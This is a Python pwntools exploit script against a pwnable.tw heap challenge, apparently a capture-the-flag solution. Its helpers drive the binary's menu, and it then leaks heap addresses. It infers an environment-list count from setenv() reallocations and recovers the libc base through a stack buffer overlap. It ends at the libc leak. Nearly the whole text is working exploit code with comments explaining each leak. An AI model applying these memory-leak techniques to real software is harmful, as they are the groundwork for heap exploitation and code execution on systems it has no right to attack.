###Leak env_cnt by nudging env_list with setenv()
###Leak libc_base with stack buffer overlap

from pwn import *

###Utils
def create(htype,name,content=None):
    for i in range(10):
        if hdoc[i]=='':
            hdoc[i] = htype
            break
    if htype=='normal':
        htype = '1'
    elif htype=='clock':
        htype = '2'
    elif htype=='system':
        htype = '3'
    r.sendlineafter('choice : ','1')
    r.sendafter('heap:',name)
    r.sendlineafter('choice : ',htype)
    if htype=='1':
        r.sendafter('heap :',content)


def show(idx):
    r.sendlineafter('choice : ','2')
    r.sendlineafter('heap :',str(idx))
    return r.recvuntil('********')[:-9]

def rename(idx,name):
    r.sendlineafter('choice : ','3')
    r.sendlineafter('heap :',str(idx))
    r.sendafter('heap:',name)

def play_norm(mode,data=None):
    if mode=='show':
        mode = 1
    elif mode=='update':
        mode = 2
    r.sendlineafter('choice : ',str(mode))
    if mode==1:
        return r.recvuntil('********')[9:-9]
    elif mode==2:
        r.sendafter('Content :',data)
        return None

def play_clock(mode):
    if mode=='show':
        mode = 1
    elif mode=='update':
        mode = 2
    r.sendlineafter('choice : ',str(mode))
    if mode==1:
        return r.recvuntil('********')[:-9]
    elif mode==2:
        return None

def play_sys(mode,envname=None,envval=None):
    if mode=='set':
        mode = 1
    elif mode=='unset':
        mode = 2
    elif mode=='get_path':
        mode = 3
    elif mode=='get_val':
        mode = 4
    r.sendlineafter('choice : ',str(mode))
    if mode==1:
        r.sendlineafter('heap :',envname)
        r.sendlineafter('name :',envval)
        return None
    elif mode==2:
        r.sendlineafter('unset :',envname)
        return None
    elif mode==3:
        return None
    elif mode==4:
        r.sendlineafter('see :',envname)
        return None

def leave_play(idx):
    htype = hdoc[idx]
    if htype=='normal':
        r.sendlineafter('choice : ','3')
    elif htype=='clock':
        r.sendlineafter('choice : ','3')
    elif htype=='system':
        r.sendlineafter('choice : ','5')

def play(idx,mode,data=None,envname=None,envval=None):
    r.sendlineafter('choice : ','4')
    r.sendlineafter('heap :',str(idx))
    htype = hdoc[idx]
    if htype=='normal':
        ret = play_norm(mode,data)
    elif htype=='clock':
        ret = play_clock(mode)
    elif htype=='system':
        ret = play_sys(mode,envname,envval)
    leave_play(idx)
    return ret

def delete(idx):
    r.sendlineafter('choice : ','5')
    r.sendlineafter('heap :',str(idx))
    hdoc[idx] = ''

def leave():
    r.sendlineafter('choice : ','6')

###Exploit
###Initialize
hdoc = ['' for i in range(10)]
r = remote('chall.pwnable.tw',10500)

###Leak env_cnt
create('system','0')            #0
play(0,'set',envname='A',envval='A')

create('normal','1','a'*0x28)   #1
create('normal','2','a'*0x28)   #2
play(1,'update','a'*0x28)
block2_addr = u64(show(1).split(b'\n')[1][0x3a:].ljust(8,b'\x00'))
#  It is unlikely that the env block would shift heap by an entire 0x1000, so discarding the last 3 octs would give heap offset
heap_addr = block2_addr&0xfffffffffffff000
#  0x10     -> block2_ptr - block2_addr
#  0x20*2   -> block0_name & block1_name
#  0x20     -> A data
#  0x20     -> currect dir
#  0x30     -> rbtree node(A)
env_size = block2_addr-heap_addr-0x10-0x20*2-0x20-0x20-0x30
env_cnt_base = (env_size-0x10)//0x8

#  Try nudging the env_list to get exact env_cnt
play(0,'set',envname='B',envval='B')
create('normal','3','a'*0x28)   #3
create('normal','4','a'*0x28)   #4
play(3,'update','a'*0x28)
block4_addr = u64(show(3).split(b'\n')[1][0x3a:].ljust(8,b'\x00'))
#  If there are more than one slot left in env_list(original env_cnt was one lesses), the next realloc by setenv() will do nothing
#  New block will be placed at block2_addr+0x20(block2_name)+0x20(block3_name)+0x20(B data)+0x30(rbtree node(B))
if block4_addr==block2_addr+0x20+0x20+0x20+0x30:
    env_cnt = env_cnt_base-1
else:
    env_cnt = env_cnt_base

#  Obviously, A wasn't in the original env_list, so minus one more to get original cnt
env_cnt-=1
print(env_cnt)

###Easier way to leak libc
#  Actually, the name buffer will overlap with previous stack frame where <IO_stdfile_1_lock> is
#  This allows us to leak libc_addr with the remaining value
#  But I'll stick to the original unsorted bin method anyway
create('normal','5','a'*0x28)       #5
IO_stdfile_1_lock_offset = 0x3c6780
IO_stdfile_1_lock_addr = (u64(show(5).split(b'\n')[0][7:]+b'\x00\x00')&0xffffffffffffff00)+(IO_stdfile_1_lock_offset&0xff)
libc_base = IO_stdfile_1_lock_addr-IO_stdfile_1_lock_offset
print(hex(libc_base))
